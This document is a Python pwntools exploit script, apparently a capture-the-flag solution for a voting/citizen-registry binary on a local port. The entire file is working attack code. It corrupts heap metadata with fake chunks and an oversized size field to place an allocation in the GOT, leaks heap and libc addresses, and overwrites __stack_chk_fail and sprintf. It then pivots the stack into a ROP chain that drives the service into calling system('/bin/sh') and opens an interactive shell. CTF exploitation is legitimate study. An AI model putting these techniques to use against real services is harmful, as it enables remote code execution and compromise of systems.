from pwn import *
from subprocess import Popen, PIPE

def get_rop(binary, rop):
    p = Popen(['ROPgadget', '--binary', binary], stdout=PIPE)
    res = p.communicate()[0]
    lines = res.split('\n')
    for l in lines:
        if rop in l:
            addr = int(l.split(' : ')[0], 16)
            return addr

    return None

def send_string(conn, l, s):
        conn.recvuntil(':')
        conn.send('%d\n' % l)
        if l > 0:
            conn.recvuntil(':')
            if l == len(s):
                    conn.send('%s' % s)
            else:
                conn.send('%s\n' % s)

def send_string2(conn, s):
    send_string(conn, len(s), s)

binary = './pwn_task/pwn-strip'

is_remote = True
# is_remote = False

if not is_remote:
    c = process(binary)
else:
    c = remote('127.0.0.1', 1337)

# add candidate

c.recvuntil('>')
c.send('1\n')

c.recvuntil('>')
c.send('1\n')
send_string(c, 16, 'a')

c.recvuntil('>')
c.send('2\n')
send_string(c, 16, 'a')

c.recvuntil('>')
c.send('3\n')
send_string(c, 16, 'a')

c.recvuntil('>')
c.send('4\n')
send_string(c, 16, 'a')

c.recvuntil('>')
c.send('6\n')

# add candidate

c.recvuntil('>')
c.send('1\n')

# allocate chunk1
c.recvuntil('>')
c.send('1\n')
send_string(c, 368, 'a')

# allocate chunk2
c.recvuntil('>')
c.send('2\n')
send_string(c, 368, 'a')

# allocate chunk3
c.recvuntil('>')
c.send('3\n')
send_string(c, 368, 'a')

# free chunk1
# set chunk2->prev_size = 0x180
c.recvuntil('>')
c.send('1\n')
send_string(c, 0, None)

# allocate chunk1
# overwrite chunk2->prev_size: 0x180 -> 0x80
c.recvuntil('>')
c.send('1\n')

payload = 'a'*(368 - 0x100)
# fake chunk
payload += p64(0) # prev_size
payload += p64(0x1000000 - 0x80 + 1) # size | flags
payload += p64(0) # fd
payload += p64(0) # bk

payload = payload.ljust(368, 'b')

send_string2(c, payload)

# free chunk1
c.recvuntil('>')
c.send('1\n')
send_string(c, 0, None)

# free chunk2 and merge it with prev chunk
c.recvuntil('>')
c.send('2\n')
send_string(c, 0, None)

# leak heap addr
c.recvuntil('>')
c.send('1\n')
send_string(c, 0x300, 'a')

c.recvuntil('>')
c.send('2\n')
send_string(c, 16, 'a')

c.recvuntil('>')
c.send('1\n')
send_string(c, 0x300 - 0x80 - 16, 'a')

c.recvuntil('>')
c.send('5\n')
res = c.recvuntil('>')

p1 = 'citizen_id:'
p2 = 'address:'
idx1 = res.index(p1)
idx2 = res.index(p2)

leak_str = res[idx1 + len(p1) + 1:idx2-1].ljust(8, '\0')
leak = u64(leak_str)

heap = leak - 0x3b0

print 'heap: 0x%x' % heap

# allocate chunk in .got.plt
c.send('6\n')
c.recvuntil('>')

c.send('1\n')

# allocate chunk1
c.recvuntil('>')
c.send('1\n')
send_string(c, 368, 'a')

# allocate chunk2
c.recvuntil('>')
c.send('2\n')
send_string(c, 368, 'a')

# allocate chunk3
c.recvuntil('>')
c.send('3\n')
send_string(c, 368, 'a')

# free chunk1
# set chunk2->prev_size = 0x180
c.recvuntil('>')
c.send('1\n')
send_string(c, 0, None)

# allocate chunk1
# overwrite chunk2->prev_size: 0x180 -> 0x80
c.recvuntil('>')
c.send('1\n')

payload = 'a'*(368 - 0x100)
# fake chunk
payload += p64(0) # prev_size
size = 2**64 - 1 - 0x180
size |= 1
payload += p64(size) # size | flags
payload += p64(0) # fd
payload += p64(0) # bk

payload = payload.ljust(368, 'b')

send_string2(c, payload)

# free chunk1
c.recvuntil('>')
c.send('1\n')
send_string(c, 0, None)

# free chunk2 and merge it with prev chunk
c.recvuntil('>')
c.send('2\n')

got = 0x604018 - 16 - 16
chunk = heap + 0x80 * 2
diff = 2**64 + got - chunk

send_string(c, diff, 'a')

c.recvuntil('>')
c.send('4\n')

'''
000000604018  001800000007 R_X86_64_JUMP_SLO 0000000000400910 free@GLIBC_2.2.5 + 0
000000604020  000100000007 R_X86_64_JUMP_SLO 0000000000000000 abort@GLIBC_2.2.5 + 0 <-
000000604028  000200000007 R_X86_64_JUMP_SLO 0000000000000000 sigaction@GLIBC_2.2.5 + 0
000000604030  000300000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0
000000604038  000400000007 R_X86_64_JUMP_SLO 0000000000000000 strlen@GLIBC_2.2.5 + 0
000000604040  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
000000604048  000600000007 R_X86_64_JUMP_SLO 0000000000000000 mmap@GLIBC_2.2.5 + 0
000000604050  000700000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
000000604058  000800000007 R_X86_64_JUMP_SLO 0000000000000000 close@GLIBC_2.2.5 + 0
000000604060  000900000007 R_X86_64_JUMP_SLO 0000000000000000 pipe@GLIBC_2.2.5 + 0
000000604068  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000604070  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000604078  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 strtoull@GLIBC_2.2.5 + 0
000000604080  000d00000007 R_X86_64_JUMP_SLO 0000000000000000 calloc@GLIBC_2.2.5 + 0
000000604088  000e00000007 R_X86_64_JUMP_SLO 0000000000000000 strcmp@GLIBC_2.2.5 + 0
000000604090  000f00000007 R_X86_64_JUMP_SLO 0000000000000000 syscall@GLIBC_2.2.5 + 0
000000604098  001000000007 R_X86_64_JUMP_SLO 0000000000000000 sigemptyset@GLIBC_2.2.5 + 0
0000006040a0  001200000007 R_X86_64_JUMP_SLO 0000000000000000 prctl@GLIBC_2.2.5 + 0
0000006040a8  001900000007 R_X86_64_JUMP_SLO 0000000000400a30 malloc@GLIBC_2.2.5 + 0
0000006040b0  001300000007 R_X86_64_JUMP_SLO 0000000000000000 perror@GLIBC_2.2.5 + 0 <-
0000006040b8  001400000007 R_X86_64_JUMP_SLO 0000000000000000 sprintf@GLIBC_2.2.5 + 0
0000006040c0  001500000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
0000006040c8  001600000007 R_X86_64_JUMP_SLO 0000000000000000 wait@GLIBC_2.2.5 + 0
0000006040d0  001700000007 R_X86_64_JUMP_SLO 0000000000000000 fork@GLIBC_2.2.5 + 0
'''

payload = ''
n = 4
for i in xrange(n):
    payload += p64(0x0000000000400916 + 0x10 * (i + 1))

# overwrite __stack_chk_fail to ret
ret = get_rop(binary, 'pop rdi ; ret') + 1
payload += p64(ret)
send_string(c, 128, payload)

c.recvuntil('>')
c.send('1\n')

# overwrite sprintf to read_string
read_string = 0x000000000401778
payload = 'a'*8
payload += p64(read_string)

send_string(c, 32, payload)

# do stack buffer overflow
c.send('7\n')
c.recvuntil('>')

c.send('3\n')
c.recvuntil('address: a\n')

pop_rdi      = get_rop(binary, 'pop rdi ; ret')
pop_rsi_r15  = get_rop(binary, 'pop rsi ; pop r15 ; ret')
print_string = 0x0000000000401759
read_f       = 0x00000000004009B0
write_got    = 0x0000000000604030
read_string  = 0x0000000000401778
# pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pivot_stack  = get_rop(binary, 'pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret')

some_string  = 0x0000000000402D51 

payload = 'a'*0x38

stack = heap + 0x40000

rop_size = 4096

# rop chain
payload += \
    p64(pop_rdi) + \
    p64(write_got) + \
    p64(print_string) + \
    p64(pop_rdi) + \
    p64(stack) + \
    p64(pop_rsi_r15) + \
    p64(rop_size) + \
    p64(0) + \
    p64(read_string) + \
    p64(pivot_stack) + \
    p64(stack)

c.send('%s\n' % payload)

res = c.recv(4096)[len('votes: ') + 0x38 + 5:]
res = res.ljust(8, '\0')

write_off   = 0x00000000000f7280
pop_rdx_off = 0x0000000000001b92
system_off  = 0x0000000000045390

write_addr = u64(res)
libc_base = write_addr - write_off

pop_rdx = libc_base + pop_rdx_off 
system = libc_base + system_off

print 'libc: 0x%x' % libc_base

# r13, r14, r15
payload = \
    p64(0) + \
    p64(0) + \
    p64(0)

read_fd  = 3
write_fd = 6

if is_remote:
    read_fd += 2
    write_fd += 2

#define CHECK  1
#define STORE  2
#define DELETE 3
#define LIST   4
#define VOTE   5

process_req = \
    p32(2) + \
    p64(2**64 - 1) + \
    'A'*24 + \
    p64(2**64 - 1) + \
    '\0'

process_req += \
    p64(0)

diff = 0x200 + 0x00
process_req += \
    p64(2**64 - diff) + \
    '/bin/sh\0'

process_req += \
    p64(64) + \
    'A'*24 + \
    p64(system) + \
    '\0'

process_req += \
    p64(48) + \
    'A'*48

payload += \
    p64(pop_rdi) + \
    p64(heap) + \
    p64(pop_rsi_r15) + \
    p64(len(process_req)) + \
    p64(0) + \
    p64(read_string)

payload += \
    p64(pop_rdi) + \
    p64(write_fd) + \
    p64(pop_rsi_r15) + \
    p64(heap) + \
    p64(0) + \
    p64(pop_rdx) + \
    p64(len(process_req)) + \
    p64(write_addr)

payload += \
    p64(pop_rdi) + \
    p64(read_fd) + \
    p64(pop_rsi_r15) + \
    p64(heap + 4096 * 4) + \
    p64(0) + \
    p64(pop_rdx) + \
    p64(4096) + \
    p64(read_f)

c.send('%s\n' % payload)

c.send('%s' % process_req)

print '[+] shell'

c.interactive()
